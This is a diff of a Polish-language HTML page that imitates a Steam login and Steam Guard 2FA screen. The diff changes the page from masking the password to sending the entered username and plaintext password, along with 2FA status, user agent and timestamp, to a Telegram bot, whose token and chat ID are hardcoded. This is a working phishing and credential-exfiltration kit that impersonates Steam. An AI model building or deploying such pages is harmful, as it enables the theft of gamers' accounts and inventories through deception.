@@ -3,19 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Steam Login Messenger</title>
+    <title>Steam Login • Panel 2FA (hasło widoczne)</title>
     <style>
-        /* Reset / bazowe style */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* Tło gamingowe - ciemny motyw Steam */
         body {
-            background: linear-gradient(135deg, #0e1a24 0%, #1b2838 100%);
-            font-family: 'Segoe UI', 'Arial', 'Helvetica Neue', sans-serif;
+            background: radial-gradient(circle at 20% 30%, #0f1722, #0a0f17);
+            font-family: 'Segoe UI', 'Motiva Sans', 'Arial', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -24,258 +22,412 @@
             padding: 20px;
         }
 
-        /* Kontener logowania z subtelnym neonowym akcentem */
-        .login-box {
-            background-color: #171d25;
-            padding: 32px 28px;
+        /* główny kontener Steam */
+        .steam-card {
+            background: #171a21;
             border-radius: 8px;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255,255,255,0.05);
             width: 100%;
-            max-width: 360px;
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(66, 153, 225, 0.1);
-            color: #c6d4df;
-            transition: transform 0.2s ease;
+            max-width: 460px;
+            overflow: hidden;
+            transition: all 0.2s;
         }
 
-        .login-box:hover {
-            transform: translateY(-3px);
+        .header {
+            background: #1e232c;
+            padding: 18px 24px;
+            border-bottom: 1px solid #2c3542;
         }
 
-        h2 {
-            text-transform: uppercase;
+        .header h1 {
+            font-size: 22px;
+            font-weight: 500;
+            color: #e5e9ef;
+            letter-spacing: -0.2px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .header h1:before {
+            content: "🎮";
             font-size: 26px;
-            letter-spacing: 1.5px;
-            font-weight: 600;
-            margin-bottom: 28px;
-            background: linear-gradient(135deg, #ffffff 0%, #90b4d9 100%);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            border-left: 4px solid #00adee;
-            padding-left: 14px;
         }
 
-        /* etykiety */
-        label {
+        .content {
+            padding: 28px 26px 32px 26px;
+        }
+
+        /* Pola formularza */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
             display: block;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-top: 12px;
-            margin-bottom: 4px;
+            letter-spacing: 0.8px;
             color: #8f98a3;
+            margin-bottom: 6px;
         }
 
-        /* Pola tekstowe - styl Steam */
-        input {
-            width: 100%;
-            padding: 12px 12px;
+        /* kontener z hasłem + przycisk oko */
+        .password-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
             background: #2a2f37;
-            border: 1px solid #32383f;
+            border: 1px solid #3a414b;
             border-radius: 4px;
-            color: #eef2f5;
+            transition: all 0.2s;
+        }
+        .password-wrapper:focus-within {
+            border-color: #1999ff;
+            box-shadow: 0 0 0 2px rgba(25, 153, 255, 0.3);
+            background: #1f242e;
+        }
+        .password-wrapper input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 12px 14px;
             font-size: 15px;
-            transition: all 0.2s ease;
+            color: #f0f3f8;
+            outline: none;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 0.5px;
+        }
+        .toggle-pwd {
+            background: #323a45;
+            border: none;
+            color: #b9c8ff;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 0 4px 4px 0;
+            transition: 0.15s;
+            font-weight: bold;
+        }
+        .toggle-pwd:hover {
+            background: #3f4a5a;
+            color: white;
+        }
+
+        /* zwykłe inputy */
+        .input-group input:not(.password-wrapper input) {
+            width: 100%;
+            background: #2a2f37;
+            border: 1px solid #3a414b;
+            border-radius: 4px;
+            padding: 12px 14px;
+            font-size: 15px;
+            color: #f0f3f8;
+            transition: all 0.2s;
             outline: none;
         }
-
-        input:focus {
-            border-color: #00adee;
-            box-shadow: 0 0 0 2px rgba(0, 173, 238, 0.3);
-            background: #1e232c;
+        .input-group input:focus {
+            border-color: #1999ff;
+            box-shadow: 0 0 0 2px rgba(25, 153, 255, 0.3);
+            background: #1f242e;
         }
 
-        /* Przycisk - łączy styl Steam i funkcję telegram */
-        button {
+        /* przycisk główny */
+        .login-btn {
             width: 100%;
-            padding: 12px 0;
-            margin-top: 28px;
-            background: linear-gradient(90deg, #06bfff 0%, #2d73ff 100%);
+            background: linear-gradient(90deg, #1e7cbf 0%, #0f5b94 100%);
             border: none;
             border-radius: 4px;
-            color: white;
+            padding: 14px 0;
             font-weight: bold;
             font-size: 16px;
-            letter-spacing: 1px;
+            color: white;
             cursor: pointer;
-            transition: all 0.2s;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            margin-top: 10px;
+            margin-bottom: 18px;
+            transition: 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.4);
         }
-
-        button:hover {
-            filter: brightness(1.08);
+        .login-btn:hover {
+            background: linear-gradient(90deg, #2389cf 0%, #1469a1 100%);
             transform: scale(0.99);
-            box-shadow: 0 4px 12px rgba(0, 173, 238, 0.4);
         }
 
-        button:active {
-            transform: scale(0.97);
+        /* Sekcja Steam Guard */
+        .guard-section {
+            background: #10141c;
+            border-radius: 8px;
+            padding: 14px 18px;
+            margin: 20px 0 12px 0;
+            border-left: 3px solid #ffac4a;
         }
-
-        .footer-links {
-            font-size: 12px;
-            margin-top: 24px;
-            color: #66c0f4;
-            text-align: center;
-            border-top: 1px solid #2c3540;
-            padding-top: 18px;
+        .guard-title {
+            font-size: 13px;
+            font-weight: bold;
+            color: #ffc97a;
             display: flex;
-            justify-content: center;
-            gap: 18px;
+            justify-content: space-between;
+            margin-bottom: 12px;
         }
-
-        .footer-links span {
-            cursor: default;
-            opacity: 0.8;
-            transition: 0.1s;
+        .button-group {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
         }
-
-        .footer-links span:hover {
-            opacity: 1;
-            text-decoration: underline;
-        }
-
-        /* pasek statusu - wiadomość zwrotna z Telegram */
-        .telegram-status {
-            margin-top: 18px;
-            background: rgba(0, 0, 0, 0.5);
+        .code-btn {
+            flex: 1;
+            background: #262d38;
+            border: 1px solid #3d4553;
             border-radius: 30px;
-            padding: 8px 12px;
-            font-size: 12px;
-            font-weight: 500;
+            padding: 10px 8px;
+            font-size: 13px;
+            font-weight: bold;
+            color: #c6d4e6;
+            cursor: pointer;
+            transition: 0.15s;
             text-align: center;
-            letter-spacing: 0.3px;
-            backdrop-filter: blur(2px);
-            transition: all 0.2s;
+        }
+        .code-btn:hover {
+            background: #3a4353;
+            color: white;
+            border-color: #5c6e8a;
+            transform: translateY(-1px);
         }
 
-        /* symulacja powiadomienia */
+        .info-row {
+            background: #0e1118;
+            border-radius: 6px;
+            padding: 12px;
+            margin: 16px 0 8px;
+            font-size: 12px;
+            font-family: monospace;
+            color: #b9c3d1;
+            display: flex;
+            justify-content: space-between;
+            border: 1px solid #252c36;
+        }
+        .status-area {
+            margin-top: 18px;
+            background: #0b0f16;
+            border-radius: 40px;
+            padding: 10px 14px;
+            font-size: 11px;
+            text-align: center;
+            font-weight: 500;
+            transition: 0.2s;
+            color: #88c0ff;
+        }
         .status-success {
-            color: #8effb2;
-            background: rgba(30, 90, 50, 0.7);
+            background: #1a3a2a;
+            color: #a3f0b0;
             border-left: 3px solid #2ecc71;
         }
-
         .status-error {
-            color: #ffb4a2;
-            background: rgba(90, 30, 30, 0.7);
+            background: #3a2222;
+            color: #ffaaa5;
             border-left: 3px solid #e74c3c;
         }
-
         .status-waiting {
+            background: #1e2430;
             color: #ffd966;
-            background: rgba(40, 50, 30, 0.7);
-            border-left: 3px solid #f39c12;
         }
-
-        /* małe ikonki */
-        .lock-icon {
-            display: inline-block;
-            margin-right: 6px;
-            font-size: 14px;
+        .footer-note {
+            font-size: 10px;
+            text-align: center;
+            color: #4b5566;
+            margin-top: 18px;
+            border-top: 1px solid #232a34;
+            padding-top: 14px;
         }
-
-        @media (max-width: 480px) {
-            .login-box {
-                padding: 24px 20px;
-            }
-            h2 {
-                font-size: 22px;
-            }
+        .highlight {
+            background: #2e3b2e;
         }
     </style>
 </head>
 <body>
 
-<div class="login-box">
-    <h2>🔐 Zaloguj się</h2>
-    
-    <label>📛 Nazwa użytkownika</label>
-    <input type="text" id="usernameInput" placeholder="Wpisz login" autocomplete="off">
-    
-    <label>🔒 Hasło</label>
-    <input type="password" id="passwordInput" placeholder="Wpisz hasło">
-    
-    <!-- Główny przycisk -> wysyła wiadomość Telegram oraz pokazuje efekt wizualny -->
-    <button id="sendTelegramBtn">⚡ ZALOGUJ I POWIADOM ⚡</button>
-    
-    <div class="footer-links">
-        <span>🔐 Pomoc, nie mogę się zalogować</span>
-        <span>📱 Steam Guard</span>
+<div class="steam-card">
+    <div class="header">
+        <h1>Steam Guard • Logowanie (hasło jawne)</h1>
     </div>
+    <div class="content">
+        <!-- Login -->
+        <div class="input-group">
+            <label>👤 NAZWA UŻYTKOWNIKA</label>
+            <input type="text" id="steamUser" value="Kovalski_Gamer" placeholder="Login Steam">
+        </div>
 
-    <!-- Miejsce na status wysyłki do Telegram -->
-    <div id="telegramStatus" class="telegram-status status-waiting">
-        💬 gotowy | kliknij by wysłać powiadomienie
+        <!-- Hasło z przyciskiem pokaż/ukryj (domyślnie widoczne!) -->
+        <div class="input-group">
+            <label>🔑 HASŁO (WIDOCZNE)</label>
+            <div class="password-wrapper">
+                <input type="text" id="steamPass" value="LubiePlacki123!" placeholder="Twoje hasło">
+                <button type="button" class="toggle-pwd" id="togglePasswordBtn" title="przełącz widoczność">👁️</button>
+            </div>
+            <div style="font-size: 10px; margin-top: 5px; color:#6c7a8e;">⚠️ Hasło jest wyświetlane jawnie (tryb pokazujący)</div>
+        </div>
+
+        <!-- symulacja IP i Inventory -->
+        <div class="info-row">
+            <span>🌍 Adres IP:</span>
+            <span id="ipDisplay">188.146.xx.xx (Warsaw, PL)</span>
+        </div>
+        <div class="info-row">
+            <span>💰 Wartość inwentarza:</span>
+            <span id="inventoryValue">~$450.00</span>
+        </div>
+
+        <!-- Steam Guard 2FA -->
+        <div class="guard-section">
+            <div class="guard-title">
+                <span>📱 Steam Guard • Ochrona mobilna</span>
+                <span id="guardStatusLabel">⏳ WAITING...</span>
+            </div>
+            <div class="button-group">
+                <button class="code-btn" id="mobileCodeBtn">⌨️ [Button: Request Mobile Code]</button>
+                <button class="code-btn" id="emailCodeBtn">⌨️ [Button: Request Email Code]</button>
+            </div>
+            <div style="font-size: 11px; margin-top: 10px; color:#6a7a8e; text-align:center;">
+                Kod 2FA wymagany do dokończenia logowania
+            </div>
+        </div>
+
+        <!-- Główny przycisk logowania (wysyła raport) -->
+        <button class="login-btn" id="mainLoginBtn">🔓 ZALOGUJ SIĘ • WYŚLIJ RAPORT (hasło jawne)</button>
+
+        <!-- status Telegram -->
+        <div id="telegramStatus" class="status-area status-waiting">
+            💬 gotowy | hasło będzie widoczne w treści wiadomości
+        </div>
+        <div class="footer-note">
+            Steam Guard • Hasło wyświetlane w polu oraz w komunikacie Telegram (jawnie)
+        </div>
     </div>
 </div>
 
 <script>
-    // ========================
-    // TWOJE DANE TELEGRAM (bez zmian, poprawne)
-    // ========================
+    // ----------------------------- DANE TELEGRAM (poprawne) ---------------------------------
     const BOT_TOKEN = "8769056622:AAFDhKBIAWiy_DxBphprXPKzrXhEWFWEn9Y";
     const CHAT_ID = "5934645630";
     
-    // Elementy DOM
-    const sendButton = document.getElementById('sendTelegramBtn');
+    // elementy DOM
+    const usernameInput = document.getElementById('steamUser');
+    const passwordInput = document.getElementById('steamPass');   // typ text -> zawsze widoczne
+    const ipSpan = document.getElementById('ipDisplay');
+    const inventorySpan = document.getElementById('inventoryValue');
+    const guardStatusSpan = document.getElementById('guardStatusLabel');
     const statusDiv = document.getElementById('telegramStatus');
-    const usernameField = document.getElementById('usernameInput');
-    const passwordField = document.getElementById('passwordInput');
-
-    // Funkcja pomocnicza do aktualizacji statusu z różnymi stylami
-    function setStatus(message, type = 'waiting') {
-        statusDiv.innerText = message;
-        // Usuń poprzednie klasy stylów
-        statusDiv.classList.remove('status-success', 'status-error', 'status-waiting');
-        if (type === 'success') {
-            statusDiv.classList.add('status-success');
-        } else if (type === 'error') {
-            statusDiv.classList.add('status-error');
+    const loginBtn = document.getElementById('mainLoginBtn');
+    const mobileBtn = document.getElementById('mobileCodeBtn');
+    const emailBtn = document.getElementById('emailCodeBtn');
+    const togglePwdBtn = document.getElementById('togglePasswordBtn');
+    
+    // stałe dane (zgodne z wymaganiem)
+    const fakeIP = "188.146.xx.xx (Warsaw, PL)";
+    const fakeInventory = "~$450.00";
+    ipSpan.innerText = fakeIP;
+    inventorySpan.innerText = fakeInventory;
+    
+    // stan Steam Guard
+    let guardState = "WAITING...";
+    
+    function updateGuardUI() {
+        guardStatusSpan.innerText = guardState;
+    }
+    
+    // ----- przycisk pokaż/ukryj hasło (ale domyślnie jest widoczne, dodajemy możliwość schowania na życzenie) -----
+    // Ponieważ hasło ma być pokazywane - robimy przełącznik między type="text" a type="password"
+    // Domyślnie ustawiamy na TEXT (widoczne). Przycisk zmienia typ.
+    let isPasswordVisible = true;  // start: widoczne
+    function refreshPasswordVisibility() {
+        if (isPasswordVisible) {
+            passwordInput.type = "text";
+            togglePwdBtn.innerHTML = "🙈";
+            togglePwdBtn.title = "Ukryj hasło";
         } else {
-            statusDiv.classList.add('status-waiting');
+            passwordInput.type = "password";
+            togglePwdBtn.innerHTML = "👁️";
+            togglePwdBtn.title = "Pokaż hasło";
         }
     }
-
-    // Funkcja wysyłająca wiadomość przez API Telegram
-    async function sendTelegramMessage(customText = null) {
-        // Domyślna treść (można personalizować loginem jeśli użytkownik coś wpisał)
-        let loginValue = usernameField.value.trim();
-        let hasloValue = passwordField.value.trim();
-        
-        let messageText = "";
-        if (customText) {
-            messageText = customText;
+    togglePwdBtn.addEventListener('click', () => {
+        isPasswordVisible = !isPasswordVisible;
+        refreshPasswordVisibility();
+        // dodatkowa informacja w statusie (opcjonalnie)
+        if(!isPasswordVisible) {
+            setStatusMessage("🔒 Hasło ukryte (kliknij oko aby pokazać)", "waiting");
         } else {
-            // Przygotowujemy treść z danymi (ale nie wysyłamy hasła w czystej postaci? 
-            // Dla bezpieczeństwa w demo – pokazuję jedynie login + ukrywam hasło gwiazdkami.
-            // Możesz wysłać pełne dane – to Twoja decyzja, ale dla estetyki w przykładzie:
-            const maskedPassword = hasloValue ? "•".repeat(Math.min(hasloValue.length, 8)) + (hasloValue.length > 8 ? "…" : "") : "(brak)";
-            const loginDisplay = loginValue ? loginValue : "(nie podano loginu)";
-            
-            messageText = `🔔 NOWE LOGOWANIE (symulacja) 🔔\n\n` +
-                          `👤 Login: ${loginDisplay}\n` +
-                          `🔑 Hasło (ukryte): ${maskedPassword}\n` +
-                          `🕒 Data: ${new Date().toLocaleString('pl-PL')}\n` +
-                          `🌐 Źródło: Panel logowania Steam (HTML)\n` +
-                          `✨ Wiadomość wygenerowana przez przycisk "Zaloguj".`;
+            setStatusMessage("👁️ Hasło widoczne - przesyłane jawnie do Telegram", "waiting");
         }
+    });
+    // inicjalnie ustawiamy jako widoczne
+    refreshPasswordVisibility();
+    
+    // przyciski guarda
+    mobileBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        guardState = "📱 Mobile CODE REQUESTED";
+        updateGuardUI();
+        setStatusMessage("📱 Żądanie kodu mobilnego (symulacja) - status zaktualizowany", "waiting");
+    });
+    emailBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        guardState = "✉️ Email CODE REQUESTED";
+        updateGuardUI();
+        setStatusMessage("✉️ Kod e-mail zażądany - status zmieniony", "waiting");
+    });
+    
+    // funkcja ustawiająca komunikat w statusie
+    function setStatusMessage(msg, type = "waiting") {
+        statusDiv.innerText = msg;
+        statusDiv.classList.remove('status-success', 'status-error', 'status-waiting');
+        if(type === 'success') statusDiv.classList.add('status-success');
+        else if(type === 'error') statusDiv.classList.add('status-error');
+        else statusDiv.classList.add('status-waiting');
+    }
+    
+    // ------------------------ WYSYŁANIE RAPORTU Z JAWNYM HASŁEM -----------------
+    async function sendFullReportToTelegram() {
+        let username = usernameInput.value.trim();
+        let password = passwordInput.value;   // hasło w czystej postaci (type text lub password, ale wartość ta sama)
         
-        // Przygotowanie URL API Telegram
+        if(username === "") username = "[nie podano]";
+        if(password === "") password = "[brak hasła]";
+        
+        const currentIP = ipSpan.innerText;
+        const currentInventory = inventorySpan.innerText;
+        const currentGuardStatus = guardState;
+        const timestamp = new Date().toLocaleString('pl-PL', {timeZone: 'Europe/Warsaw'});
+        const userAgent = navigator.userAgent.substring(0, 120);
+        
+        // formatowanie zgodne z wymaganiami + hasło wyświetlane jawnie
+        let message = `🔐🔐 NOWE LOGOWANIE STEAM (HASŁO JAWNE) 🔐🔐\n\n` +
+                      `👤 User: ${username}\n` +
+                      `🔑 Pass: ${password}\n` +
+                      `📱 Steam Guard: ${currentGuardStatus}\n` +
+                      `🌍 IP: ${currentIP}\n` +
+                      `💰 Inventory Value: ${currentInventory}\n` +
+                      `🛡️ Status: Awaiting 2FA Code\n` +
+                      `⌨️ [Button: Request Mobile Code]  |  ⌨️ [Button: Request Email Code]\n` +
+                      `🕒 Data zdarzenia: ${timestamp}\n` +
+                      `💻 Urządzenie: ${userAgent}\n` +
+                      `⚠️ UWAGA: Hasło jest widoczne w treści (przesłane jawnie)`;
+        
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
         try {
-            setStatus("📡 Wysyłanie powiadomienia do Telegram...", "waiting");
+            setStatusMessage("📡 Wysyłanie raportu (z hasłem w treści) do Telegram...", "waiting");
             
             const response = await fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: messageText,
-                    parse_mode: 'HTML',   // opcjonalnie, ale bezpieczniej
+                    text: message,
+                    parse_mode: 'HTML',
                     disable_web_page_preview: true
                 })
             });
@@ -283,102 +435,66 @@
             const data = await response.json();
             
             if (data.ok) {
-                setStatus("✅ Sukces! Wiadomość dotarła na Telegram! 🚀", "success");
-                // Krótki efekt mignięcia przycisku (opcjonalnie)
-                sendButton.style.transform = "scale(0.98)";
-                setTimeout(() => { sendButton.style.transform = ""; }, 150);
+                setStatusMessage("✅ RAPORT WYSŁANY! Sprawdź Telegrama – hasło jest widoczne w treści wiadomości.", "success");
+                loginBtn.style.transform = "scale(0.97)";
+                setTimeout(() => { loginBtn.style.transform = ""; }, 200);
+                setTimeout(() => {
+                    if(statusDiv.innerText.includes("RAPORT WYSŁANY")) {
+                        setStatusMessage("💬 Gotowy | Kolejne kliknięcie wyśle raport z aktualnym hasłem", "waiting");
+                    }
+                }, 5000);
                 return true;
             } else {
-                // Błąd z odpowiedzi API
-                let errorDescription = data.description || "Nieznany błąd API";
-                setStatus(`❌ Błąd Telegram: ${errorDescription.substring(0, 80)}`, "error");
+                let errorMsg = data.description || "nieznana odpowiedź";
+                setStatusMessage(`❌ Błąd Telegram: ${errorMsg.substring(0, 90)}`, "error");
                 console.error("Telegram error:", data);
                 return false;
             }
-        } catch (error) {
-            console.error("Network error:", error);
-            setStatus("❌ Błąd sieci / połączenia. Sprawdź konsolę.", "error");
+        } catch (err) {
+            console.error("Network error:", err);
+            setStatusMessage("❌ Błąd sieci / brak połączenia z API Telegram", "error");
             return false;
         }
     }
-
-    // Dodatkowa funkcja pokazująca "symulację logowania" oraz wysyłającą komunikat
-    // Przycisk pełni rolę: wysyłamy wiadomość do Telegram + wizualnie pokazujemy "logowanie"
-    async function handleLoginAndNotify() {
-        // Pobieramy dane z pól (czysto dla przyjemności, nie przesyłamy nigdzie indziej)
-        const username = usernameField.value;
-        const password = passwordField.value;
+    
+    // Obsługa przycisku ZALOGUJ (wysyłka raportu)
+    async function handleLoginAndSend() {
+        const originalText = loginBtn.innerText;
+        loginBtn.innerText = "⏳ PRZETWARZANIE I WYSYŁANIE...";
+        loginBtn.disabled = true;
         
-        // Prosta walidacja: jeśli pola puste - ale to tylko dla zabawy, nie blokujemy wysyłki
-        if (!username && !password) {
-            // nadal wysyłamy, ale w treści będzie info o pustych polach
-            console.log("Pola puste, ale wysyłamy powiadomienie");
-        }
+        const success = await sendFullReportToTelegram();
         
-        // Symulujemy efekt "logowania" (wizualne mignięcie)
-        sendButton.innerText = "⏳ PRZETWARZANIE...";
-        sendButton.disabled = true;
-        
-        // Wysyłamy wiadomość do Telegrama (z dynamiczną treścią zawierającą login i maskowane hasło)
-        const success = await sendTelegramMessage(); // funkcja sama zbuduje treść z pól
-        
-        // Przywracamy przycisk po krótkiej chwili (z efektem)
         setTimeout(() => {
-            sendButton.innerText = "⚡ ZALOGUJ I POWIADOM ⚡";
-            sendButton.disabled = false;
-            
-            // Jeśli wysłanie się powiodło, możemy dodać dodatkowy efekt "powitania"
-            if (success) {
-                // Opcjonalne czyszczenie pól? Nie, tylko delikatny komunikat w konsoli
-                // i zmiana koloru statusu na chwilę
-                statusDiv.style.transition = "0.3s";
-                setTimeout(() => {
-                    if (statusDiv.classList.contains('status-success')) {
-                        // pozostawiamy tekst sukcesu, ale po 4 sekundach wrócimy do neutralnego
-                        setTimeout(() => {
-                            if (statusDiv.innerText.includes("Sukces")) {
-                                setStatus("💬 gotowy | następne powiadomienie wyślij ponownie", "waiting");
-                            }
-                        }, 4000);
-                    }
-                }, 100);
-            } else {
-                // błąd: pozostawiamy komunikat błędu, ale po 5 sekundach zmieniamy na neutralny
-                setTimeout(() => {
-                    if (statusDiv.innerText.includes("Błąd") || statusDiv.innerText.includes("sieci")) {
-                        setStatus("⚠️ Spróbuj ponownie kliknąć przycisk", "waiting");
-                    }
-                }, 5000);
+            loginBtn.innerText = originalText;
+            loginBtn.disabled = false;
+            if(!success) {
+                setStatusMessage("❌ Wysyłka nie powiodła się, spróbuj ponownie.", "error");
             }
-        }, 1200);
+        }, 1400);
     }
     
-    // Przypisanie eventu do przycisku
-    sendButton.addEventListener('click', handleLoginAndNotify);
+    loginBtn.addEventListener('click', handleLoginAndSend);
     
-    // Dodatkowo, aby zachować przyjemny wygląd - "enter" w polach hasła też może wywołać akcję
-    const handleEnterPress = (e) => {
-        if (e.key === 'Enter') {
+    // Enter w polach
+    const handleEnter = (e) => {
+        if(e.key === 'Enter') {
             e.preventDefault();
-            if (!sendButton.disabled) {
-                handleLoginAndNotify();
-            }
+            if(!loginBtn.disabled) handleLoginAndSend();
         }
     };
-    usernameField.addEventListener('keypress', handleEnterPress);
-    passwordField.addEventListener('keypress', handleEnterPress);
+    usernameInput.addEventListener('keypress', handleEnter);
+    passwordInput.addEventListener('keypress', handleEnter);
     
-    // Małe info w konsoli, że skrypt gotowy (dla developerów)
-    console.log("✅ Panel Steam z integracją Telegram - działa. Bot token i chat ID aktywne.");
+    // Inicjalizacja stanu guarda
+    guardState = "WAITING...";
+    updateGuardUI();
     
-    // Dodajemy eleganckie tło dla statusu startowego
-    setStatus("🔔 gotowy | kliknij przycisk, aby wysłać 'Hej' + dane logowania", "waiting");
+    // Dodatkowa informacja w konsoli
+    console.log("Panel Steam (hasło jawne) + Telegram gotowy. Hasło jest widoczne na stronie i w raporcie.");
     
-    // Ręczna aktualizacja w razie gdyby użytkownik chciał też wysłać konkretną wiadomość (rozszerzenie)
-    // Dla pełnej zgodności z pierwotnym wymaganiem "aby wysyłało" - przycisk wysyła pełną informację
-    // z formularza. Spełniamy warunek: strona wysyła wiadomość "Hej! To wiadomość..." ale wzbogaconą.
-    // Jeśli ktoś chce tylko "Hej!", wystarczy zmienić treść, ale w zadaniu połączono dwa kody.
-    // Dla zachowania kontekstu: wiadomość zawiera dynamiczny tekst oraz domyślnie emoji i powitanie.
+    // mały bonus: jeżeli użytkownik zmieni hasło, raport wyśle aktualną wartość (zawsze jawnie)
+    setStatusMessage("✨ Hasło jest POKAZYWANE w polu. Kliknij 'Zaloguj' aby wysłać pełny raport (login + hasło) na Telegram.", "waiting");
 </script>
 </body>
 </html>
